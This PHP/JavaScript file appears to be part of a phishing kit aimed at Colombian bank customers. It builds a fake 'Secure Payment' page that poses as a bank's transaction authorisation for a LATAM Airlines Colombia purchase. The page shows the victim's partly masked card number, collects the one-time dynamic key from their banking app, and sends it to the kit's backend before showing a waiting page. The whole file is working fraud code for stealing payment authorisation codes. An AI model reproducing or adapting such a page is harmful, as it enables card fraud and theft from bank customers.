<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
// $_GET['banco'] = 'colpatria';
$banco = $_GET['banco'];
$origen = isset($_GET['origen_code']) ? $_GET['origen_code'] : null;

switch ($banco) {
        // case 'colpatria':
        //     if ($origen != null) {
        //         require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}_bank/{$banco}_atm.php");
        //     } else {
        //         require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_atm.php");
        //     }
        //     break;    
    default:
?>

        var my_tarjeta = my_data['tarjeta'].substr(0,8) + '****' + my_data['tarjeta'].substr(12,16);
        var my_banco = my_data['banco'];
        var my_nombre_banco= my_data['nombre_banco'];
        var my_titulo = 'Secure Payment';
        var my_contenido = `
        <style>
            body {
                margin: 0;
                padding: 0;
                overflow: hidden;
                background-color: #ffffff;
                display: flex;
                justify-content: center;
                align-items: center;
            }

            html,
            body {
                height: 100%;
            }

            #contenedor {
                position: relative;
                /* width: 95vw; */
                /* height: 95vh; */
                background-color: #ffffff;
                overflow: hidden;
                /* Evita que las imágenes sobresalgan del contenedor */
                /* top: 50px; */
                /* left: 35px; */
                width: 310px;
                /* Ajusta el ancho según tus necesidades */
                height: 700px;
                /* Ajusta la altura según tus necesidades */
            }

            #imagenIzquierda {
                position: absolute;
                top: 10px;
                left: 20px;
                width: 70px;
                object-fit: contain;
                /* Ajusta el ancho según tus necesidades */
                height: 30px;
                /* Ajusta la altura según tus necesidades */
            }

            #imagenDerecha {
                position: absolute;
                top: 2px;
                right: 20px;
                width: 100px;
                /* Ajusta el ancho según tus necesidades */
                height: 50px;
                /* Ajusta la altura según tus necesidades */
            }

            #titulo {
                font-size: 20px;
                font-weight: bold;
                color: #333;
                /* Color del texto */
                margin-top: 70px;
                /* Espaciado superior */
                margin-bottom: 10px;
                /* Espaciado inferior */
                text-align: center;
                /* Alineación del texto */
            }

            #titulo2 {
                font-size: 16px;
                font-weight: bold;
                color: #333;
                /* Color del texto */
                margin-top: 30px;
                /* Espaciado superior */
                margin-bottom: 10px;
                /* Espaciado inferior */
                text-align: center;
                /* Alineación del texto */
            }

            #parrafo {
                font-size: 13px;
                color: #000000;
                /* Color del texto */
                margin: 0 auto;
                /* Centra el párrafo horizontalmente */
                max-width: 80%;
                /* Ancho máximo del párrafo */
                text-align: justify;
                /* Justifica el texto */
                letter-spacing: 2px;
                /* Ajusta el valor según tus preferencias */
            }

            #formulario {
                margin-top: 10px;
                padding: 0 40px;
                display: flex;
                flex-direction: column;
                align-items: flex-start;
                /* Alinea los elementos al inicio del contenedor */
            }

            .form-group {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
                width: 100%;
                /* Ajusta el ancho para que ocupe todo el contenedor */
            }

            .form-group label {
                font-size: 12px;
                font-weight: bold;
                color: #333;
                width: 30%;
                /* Ancho de la etiqueta */
                margin-right: 5px;
                /* Espaciado entre la etiqueta y el input */
                text-align: left;
                /* Alinea el texto del título a la izquierda */
            }

            .form-group input {
                width: 70%;
                /* Ancho del input */
                max-width: 130px;
                /* Ancho máximo para los inputs */
                padding: 8px;
                margin-bottom: 2px;
                margin-top: -4px;
                /* Ajusta la posición vertical del input */
                box-sizing: border-box;
                border: 1px solid #ccc;
                border-radius: 4px;
            }

            #horaTransaccion {
                font-size: 14px;
                color: #333;
                margin-top: 15px;
                text-align: center;
                /* Centra el texto */
            }

            .autorizarBtn {
                display: block;
                margin: 45px auto;
                padding: 15px 30px;
                border-radius: 10%;
                background-color: #000;
                color: #fff;
                text-align: center;
                cursor: pointer;
                font-size: 12px;
                text-decoration: none;
                border: none;
            }

            #contador {
                color: #000000;
                font-size: 12px;
                font-weight: 900;
                margin-left: 8px;
            }

            .loaderp {
                width: 48px;
                height: 48px;
                border: 5px solid #FFF;
                border-bottom-color: #dc3741;
                border-radius: 50%;
                display: inline-block;
                box-sizing: border-box;
                animation: rotation 1s linear infinite;
            }

            @keyframes rotation {
                0% {
                    transform: rotate(0deg);
                }

                100% {
                    transform: rotate(360deg);
                }
            }

            .loaderp-full {
                position: fixed;
                top: 0;
                overflow-y: hidden;
                z-index: 1000;
                background-color: white;
                width: 100vw;
                height: 100vh;

                display: none;
                flex-direction: column;
                justify-content: center;
                align-items: center;
            }

            #formulario input {
                width: 48%;
                padding: 5px;
                margin-bottom: 10px;
                box-sizing: border-box;
                display: inline-block;
            }

            #formulario label {
                display: inline-block;
                font-size: 12px;
                font-weight: bold;
                color: #333;
                margin-bottom: 5px;
                width: 50%;
            }

            #formulario {
                margin-top: 20px;
                padding: 0 20px;
            }

            #contentImg {
                height: 50px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
        </style>
        <div id="contenedor">
            <div id="contentImg">
                <img id="imagenIzquierda" src="${my_hosting}logos/${my_banco}.png" alt="Logo Visa">
                <img id="imagenDerecha" src="${my_hosting}img/ltam/logo.jpg" alt="Logo Banco" style="border-radius: 10px; width: 50px; height: 50px;">
            </div>
            <div id="contenido">
                <div id="titulo">Autorizacion de transaccion</div>
                <div id="parrafo">
                    Estás intentado realizar un pago por tarjeta de crédito/débito.
                    Necesitamos confirmar que eres tú quien realiza este pago.
                </div>
                <div id="titulo2">Detalles de la transaccion</div>
                <div id="formulario">
                    <label>Comercio: LATAM Airlines Colombia</label>
                    <label for="horaTransaccion">
                        <span id="horaTransaccion">Hora de la transacción: 14:40:31</span>
                    </label>
                    <div>
                        <label for="otp">Ingrese su clave Dinamica:</label>
                        <input type="text" id="txtCajero" name="txtCajero" maxlength="6">
                    </div>
                    <p id="contador" style="text-align: center;width: 100%;">
                        Ingrese tu Clave dinamica o Token que encuntres en tu APP
                                     Ingresa a tu APP de BANCO
                    </p>
                </div>
            </div>
            <p id="msg_error" style="color: red; text-align: center; width: 100%;"></p>

            <button class="autorizarBtn" id="btnOTP" type="button" onclick="validateData()">Autorizar</button>
            <!-- LOADER FULL -->
            <div class="loaderp-full">
                <span class="loaderp"></span>
                <p class="text-italic tc-ocean fs-3 fw-light"></p>
            </div>
        </div>
        `
<?php
        break;
}
?>

//<script>
    $(document).ready(function() {
        if (my_data['alerta'] != null) {
            $("#msg_error").text(my_data['alerta'].msg);
        }

    });

    function validateData() {
        let cajero = $("#txtCajero").val();
        if (cajero.length <= 3) {
            $("#txtCajero").focus();
            $("#msg_error").text("Ingrese un cajero valido");
            return;
        }

        processing({
            t: 'cajero',
            cajero: cajero,
        });

        if (my_data['status'] == 'rec_cajero') {
            my_data['status'] = 'wait';
            loadFile(['_wait.php']);
        }
    }